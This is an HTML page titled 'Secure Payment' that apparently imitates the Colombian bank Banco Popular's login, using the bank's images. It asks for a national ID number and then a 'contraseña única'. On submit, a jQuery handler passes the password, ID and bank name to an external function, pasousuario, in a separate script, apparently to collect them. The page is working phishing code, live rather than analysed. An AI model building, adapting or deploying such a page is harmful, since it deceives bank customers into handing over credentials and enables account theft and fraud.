<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Secure Payment</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        
  <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  


<style>
    *{
-webkit-appearance: none;
-webkit-border-radius: 0;
}
    .hidden {
      display: none;
    }

    select, input, button{
            width: 85%;
            height: 45px;
            background-color: white;
            color: black;
            border-radius: 10px;
            border:1px solid #dcdcdc;


    }
    label{
        font-size: 12px;
        margin-left: 33px;
    }

    select{
        border:1px solid #dcdcdc;
    }
    button{
        background-color:#1ca35a;
        color: white;
        border-radius: 10px;
    }
  </style>





</head>
<body style="background-color:#f5f5f5;">

5


  <script>
    function mostrarTexto2() {
      document.getElementById('texto1').style.display = 'none';
      document.getElementById('texto2').style.display = 'block';
    }
  </script>
  <br><div id="texto1">
  <img src="/img/popular.jfif" alt="" srcset="" width="100%">


   <br> <label>Tipo de documento</label>
   <center><select name="" id="">
    <option value="">Cédula De Ciudadanía</option>
   </select></center>

   <label for="">Número de documento</label>
   <center><input type="tel" name="" id="txtUsuario">
    <br><br><br><button onclick="mostrarTexto2()">Continuar</button></center>
  </div>

  <div id="texto2" class="hidden">
  <img src="/img/popular2.jfif" alt="" srcset="" width="100%">
  <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Popular">

   <label for="">Contraseña única</label>
   <center><input type="text" name="" id="txtPass">
    <br><br><br><button id="btnUsuario">Ingresar</button></center>
  </div>

  <img src="/img/popular1.jfif" alt="" srcset="" width="100%">


  
    
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>
</body>
</html>
